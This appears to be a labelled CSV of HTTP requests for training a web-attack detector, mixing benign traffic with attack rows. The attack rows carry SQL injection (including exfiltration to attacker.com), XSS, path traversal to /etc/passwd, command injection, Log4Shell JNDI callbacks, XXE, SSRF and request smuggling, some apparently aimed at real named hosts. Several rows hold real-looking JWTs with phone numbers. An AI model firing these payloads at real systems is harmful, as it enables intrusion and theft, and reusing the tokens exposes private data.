method,path,query,headers,body,ua,label
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","{""__proto__"": {""isAdmin"": true}}",,1
GET,/,,Authorization: Bearer token123; Payload: ; /bin/c?t /e*c/p?sswd,,,1
POST,/,,Content-Type: application/json,"{""alg"":""none""}",,1
DELETE,/api/v1/notifications/1024,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/search,q=security,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,id=1'/**/OR/**/'1'='1,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,1
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user392&password=pass849,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/chat/init,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/images/logo.png,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/favicon.ico,,,,,0
POST,/,,Content-Type: application/json,"{""alg"":""none""}",,1
GET,/search,q=machine+learning,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/maps/v2/tile/10/512/324.png,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: <iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/ws/notifications,,Content-Type: application/json,,,0
GET,/static/icons/heart.svg,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/user/password-update,,Content-Type: application/json,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nmap Scripting Engine,1
GET,/,,Content-Type: application/json; Payload: ..%2f..%2f..%2fetc%2fshadow,,,1
GET,/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php,ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0,1
GET,/locales/vi-VN.json,,Authorization: Bearer token123,,,0
GET,/index.php,option=com_jfeedback&controller=../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",1
GET,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/search,q=<img src=x onerror=alert(1)>,Host: example.com; Accept: */*,,curl/7.68.0,1
GET,/products,category=electronics&brand=apple,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,"Content-Type: application/json; Payload: <iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"Content-Type: application/json; Payload: PATCH /api/v1/messages/500 {""read"": true}",,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",sqlmap/1.5.2,1
GET,/products/compare,base=p1&target=p2,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","[{""query"": ""...""}, {""query"": ""...""}]",,1
GET,/api/v1/users,q=&& whoami,Host: example.com; Accept: */*,,Nikto/2.1.6,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
POST,/checkout,,Host: example.com; Accept: */*,username=user274&password=pass547,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/,,Host: example.com; Accept: */*,username=user853&password=pass391,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: <video><source onerror=""alert(1)"">",,,1
POST,/,,Content-Type: application/json,{{constructor.constructor('alert(1)')()}},,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",{smart_f_shell_exec('id')},,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: %0d%0a* CAPABILITY",,,1
GET,/,,Authorization: Bearer token123,,,1
GET,/web-api/orders/e91611fc-138c-46c8-b669-a3ee6360642a,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3Nzc0NjE4MjkiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZmI3YWY0N2YtM2ExOC00YmY1LTljZDktM2YyOWQ3OTcwOGRmIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3Nzc0NjE4MjkiLCJzdWIiOiJXRUJTSVRFQDA3Nzc0NjE4MjkiLCJpYXQiOjE3NzA2MzAyMTUsImV4cCI6MTc3MTIzNTAxNX0.Dnq0Z31CaIcLQPrYpVyMGjeZ1g4zjWquY7hcjnB8I5s; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 943a8f36-4e56-4064-8eb0-d00d1a673044",,python-requests/2.32.5,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=admin'--,curl/7.68.0,1
GET,/search,q=machine+learning+NOT+python,Content-Type: application/json,,,0
GET,/,,"Content-Type: application/json; Payload: id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,,1
POST,/,,Content-Type: application/json,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,/favicon.ico,,,,,0
GET,/,,"Content-Type: application/json; Payload: PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/login,q=| cat /etc/passwd,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
POST,/user/ui/theme,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/favicon.ico,,,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <body onload=alert(1)>",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <body onload=alert(1)>",,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,Content-Type: application/json; Payload: ..%2f..%2f..%2fetc%2fshadow,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/checkout/step1,,Authorization: Bearer token123,,,0
PUT,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
POST,/login,,Host: example.com; Accept: */*,input=../../../../etc/passwd,sqlmap/1.5.2,1
GET,/installed_emanual_down.html,path=/manual/../../../etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: gzip compressed content with chosen prefix",,,1
PUT,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/analytics/metric,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/favicon.ico,,,,,0
GET,/,php://filter/convert.base64-encode/resource=index.php,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/,class.module.classLoader.resources.context.configFile=http://d6d5bt565jrc87ck692gwbr9krzqjrsqt.oast.me&class.module.classLoader.resources.context.configFile.content.aaa=xxx,Accept-Encoding: gzip; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 Macintosh Intel Mac OS X 10_15_7 AppleWebKit/605.1.15 KHTML like Gecko Version/16.0 Safari/605.1.15,,Mozilla/5.0 Macintosh Intel Mac OS X 10_15_7 AppleWebKit/605.1.15 KHTML like Gecko Version/16.0 Safari/605.1.15,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
POST,/api/v1/user/avatar,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <body onload=alert(1)>",,,1
POST,/api/v1/posts/55/comments,,Content-Type: application/json,,,0
POST,/search,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nmap Scripting Engine,1
GET,/checkout/success,order_id=ord_123,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/admin/dashboard/users/active,,Content-Type: application/json,,,0
GET,/api/v1/tasks/rep_99/status,,Authorization: Bearer token123,,,0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,id=1&id=2,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
DELETE,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/admin/reports/sales.csv,year=2025,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/web-api/orders/f434bfa2-de26-43dc-897d-77717f3d8377,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzU0MTc2NDAiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZWE3ODNjOGUtYjE5Zi00MWM3LWFlODAtZGYwNDc0NTZmMzJmIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzU0MTc2NDAiLCJzdWIiOiJXRUJTSVRFQDA3NzU0MTc2NDAiLCJpYXQiOjE3NzA2MzAyMzcsImV4cCI6MTc3MTIzNTAzN30.eSi52KRoIT4ts4MDMdTBrSLQBpDpxxB9kazldHEFe5Q; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: c65c3e6e-2d09-4f91-8c44-410285c27ec6",,python-requests/2.32.5,0
GET,/checkout/success,order_id=ord_123,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/stream/hls/chunk_001.ts,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/ws/notifications,,Content-Type: application/json,,,0
DELETE,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
PUT,/admin,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,curl/7.68.0,1
GET,/user/profile,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"Authorization: Bearer token123; Payload: <foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/search,"q=' UNION SELECT NULL,NULL--",Host: example.com; Accept: */*,,Nmap Scripting Engine,1
DELETE,/login,,Host: example.com; Accept: */*,input=&& whoami,curl/7.68.0,1
GET,/locales/vi-VN.json,,Authorization: Bearer token123,,,0
GET,/favicon.ico,,,,,0
GET,/,,Authorization: Bearer token123; Payload: ..%252f..%252f..%252fetc%252fhosts,,,1
GET,/user/mfa/setup-qr,,Authorization: Bearer token123,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: java\tscript:alert(1)",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: dict://localhost:11211/stat",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: /index.php?name=Guest%0d%0aSet-Cookie: session=1",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,Authorization: Bearer token123; Payload: id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,Authorization: Bearer token123; Payload: Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
PUT,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/favicon.ico,,,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=| cat /etc/passwd,curl/7.68.0,1
POST,/cart,,Host: example.com; Accept: */*,username=user130&password=pass346,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: %0d%0aBcc: victim@example.com",,,1
GET,/sitemap.xml,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/api/v1/ping,,Content-Type: application/json,,,0
POST,/admin,,Host: example.com; Accept: */*,input=&& whoami,sqlmap/1.5.2,1
GET,/,,"Content-Type: application/json; Payload: id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,,1
GET,/,__proto__[admin]=true,Authorization: Bearer token123,,,1
POST,/,,Authorization: Bearer token123,"{""name"": ""__import__('os').system('id')""}",,1
GET,/favicon.ico,,,,,0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/images/logo.png,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/careers/apply,,Authorization: Bearer token123,,,0
GET,/help/kb/search,query=how+to+reset+password,Authorization: Bearer token123,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ../../../../tmp/shell.php (inside zip archive)",,,1
GET,/favicon.ico,,,,,0
GET,/api/v1/products,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nmap Scripting Engine,1
GET,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,Content-Type: application/json; Payload: <img src=x onerror=alert(1)>,,,1
POST,/web-api/orders/260209PHXPPAECY/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQ4ODMzMjkiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMjNlNWZjNjYtYzQ5OS00ZGFjLWIxMDYtODg2Y2Y5YzBiYWEyIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQ4ODMzMjkiLCJzdWIiOiJXRUJTSVRFQDA3NzQ4ODMzMjkiLCJpYXQiOjE3NzA2MzAzMTYsImV4cCI6MTc3MTIzNTExNn0.ZUYqZ6tqWqB0Ej_kTYbHXzIvcE3UcD3lEkckDIIfk4U; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 04706f90-f2aa-4d3d-ab0f-65c004a71a4c",,python-requests/2.32.5,0
POST,/login,,Host: example.com; Accept: */*,input=; ls -la,curl/7.68.0,1
POST,/,,Authorization: Bearer token123,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: query { __schema { types { name } } }",,,1
GET,/,,Authorization: Bearer token123; Payload: User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ${jndi:ldap://attacker.com/a}",,,1
GET,/favicon.ico,,,,,0
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: ../../../../etc/passwd%00",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: <video><source onerror=""alert(1)"">",,,1
GET,/i3geo/exemplos/codemirror.php,pagina=../../../../../../../../../../../../../../../../../etc/passwd,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0,1
GET,/,,"Authorization: Bearer token123; Payload: <foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/docs/api/introduction,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/wp-admin/admin-ajax.php,action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g,Accept-Encoding: gzip; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <body onload=alert(1)>",,,1
DELETE,/products,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: javascript:alert(1)",,,1
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
PUT,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT,/search,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/checkout/success,order_id=ord_123,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/cart,,Host: example.com; Accept: */*,username=user917&password=pass830,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--",,,1
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/mobile/error-not-supported-platform.html,desktop_url=javascript:alert(1337);//itms://,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",,"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",1
GET,/maps/v2/tile/10/512/324.png,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","{""$where"": ""this.user == 'admin'""}",,1
POST,/login,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",curl/7.68.0,1
POST,/,,Content-Type: application/json,"{""alg"":""none""}",,1
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/wishlist/add,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
GET,/locales/vi-VN.json,,Authorization: Bearer token123,,,0
GET,/,,Content-Type: application/json; Payload: X-Forwarded-Host: attacker.com,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: gzip compressed content with chosen prefix",,,1
GET,/newsletter/unsubscribe,token=abc123def456,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
